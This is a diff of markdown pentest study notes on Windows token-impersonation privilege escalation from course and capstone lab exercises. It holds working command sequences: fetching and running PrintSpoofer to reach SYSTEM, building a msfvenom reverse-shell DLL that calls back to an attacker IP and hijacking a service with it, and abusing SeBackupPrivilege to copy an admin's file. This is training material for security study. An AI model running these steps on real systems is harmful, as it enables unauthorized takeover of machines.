@@ -1,14 +1,97 @@
 # Token Impersonation
 
-Service accounts, briefly mentioned in the introduction task, may have a higher privilege level than the low-level user you may have. In Windows versions before Server 2019 and 10 (version 1809), these service accounts are affected by an internal man-in-the-middle vulnerability. As you may know, man-in-the-middle (MitM) attacks are conducted by intercepting network traffic. In a similar fashion, higher privileged service accounts will be forced to authenticate to a local port we listen on. Once the service account attempts to authenticate, this request is modified to negotiate a security token for the "NT AUTHORITY\SYSTEM" account. The security token obtained can be used by the user we have in a process called "impersonation". Although it has led to several exploits, the impersonation rights were not a vulnerability.
+```
+whoami /priv
+```
 
-`whoami /priv`
+
 
 Doing further research on token impersonation vulnerabilities, you will see a number of different exploits exist. These have whimsical names such as Hot Potato, Rotten Potato, Lonely Potato, Juicy Potato, etc. You will be able to decide on which "Potato" better suits your need depending on the version of the target system. While some of these exploits will run on the target system, others may require you to set up a fake server on the same network.
 
 
 
+{% hint style="info" %}
+Other privileges that may lead to privilege escalation are _SeBackupPrivilege_, _SeAssignPrimaryToken_, _SeLoadDriver_, and _SeDebug_. In this section, we'll closely inspect privilege escalation vectors in the context of _SeImpersonatePrivilege_.
+{% endhint %}
 
+## PWK2024 - SeImpersonatePrivilege
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
+...
+2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]
+
+kali@kali:~$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+C:\Users\dave> powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+```
+{% endcode %}
+
+## Capstone exercise 16.3.2 Q2
+
+{% code title="Created payload to be copied on the victim" overflow="wrap" lineNumbers="true" %}
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.218 lport=5555 -f dll > EnterpriseServiceOptional.dll
+ 
+```
+{% endcode %}
+
+{% code title="Download and restart service" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Services> iwr -uri http://192.168.45.218/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll     
+PS C:\Services> Restart-Service EnterpriseService                                                                       PS C:\Services>     
+```
+{% endcode %}
+
+### SeBackupPrivilege
+
+Used the steps from here to copy files and enable SeBackupPrivilege to copy flag.txt
+
+{% code title="Enable SeBackupPrivilege and copy flag.txt" overflow="wrap" lineNumbers="true" %}
+```
+iwr -uri http://192.168.45.218/SeBackupPrivilegeUtils.dll -Outfile SeBackupPrivilegeUtils.dll
+iwr -uri http://192.168.45.218/SeBackupPrivilegeCmdLets.dll -Outfile SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+Copy-FileSeBackupPrivilege c:\users\enterpriseadmin\Desktop\flag.txt c:\users\enterpriseuser\flag.txt
+```
+{% endcode %}
+
+## Old
 
 We will need to check the list of [CLSID](http://ohpe.it/juicy-potato/CLSID/) to use the exploit.
 
